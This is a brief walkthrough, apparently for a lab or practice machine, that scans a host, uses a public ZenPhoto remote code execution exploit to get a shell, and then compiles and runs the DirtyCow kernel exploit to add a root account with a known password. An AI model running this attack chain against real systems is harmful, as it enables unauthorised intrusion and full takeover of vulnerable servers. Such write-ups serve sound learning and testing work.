## Box: 192.168.209.41 


## NMAP
```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.3p1 Debian 3ubuntu7
23/tcp   open  ipp     CUPS 1.4
80/tcp   open  http    Apache httpd 2.2.14 ((Ubuntu))
3306/tcp open  mysql   MySQL (unauthorized)
```

## Web Enumeration (80/tcp)
- **Endpoint:** `http://192.168.209.41/test/`
- **Discovery:** Redirect from `/test` to `/test/`
- **Version:** ZenPhoto v1.4.1.4 [8157] (Official Build)

## Exploitation: Zenphoto RCE
- **Vuln:** [Exploit-DB 18083](https://www.exploit-db.com/exploits/18083)  
- **Exploit usage:**
  ```bash
  php exploit 192.168.209.41 /test/
  ```
- **Result:** Access to `zenphoto-shell#` prompt

## Privilege Escalation: DirtyCow (CVE-2016-5195)
- **Vuln details:** Dirty Cow Linux kernel exploit  
- **Exploit download:** `exploit-db.com/download/40839`  

### Exploitation Steps
```bash
# compile DirtyCow exploit
gcc -pthread dirty.c -o dirty -lcrypt

# run exploit
./dirty
# backup created: /tmp/passwd.bak
# prompt to set new root user: 
# Username: firefart, Password: password
```

### Verify Root Account
```bash
cat /etc/passwd | grep firefart
# firefart:x:0:0:pwned:/root:/bin/bash
```

- **Root shell obtained** as `firefart/password`  
- **Cleanup:** `mv /tmp/passwd.bak /etc/passwd`
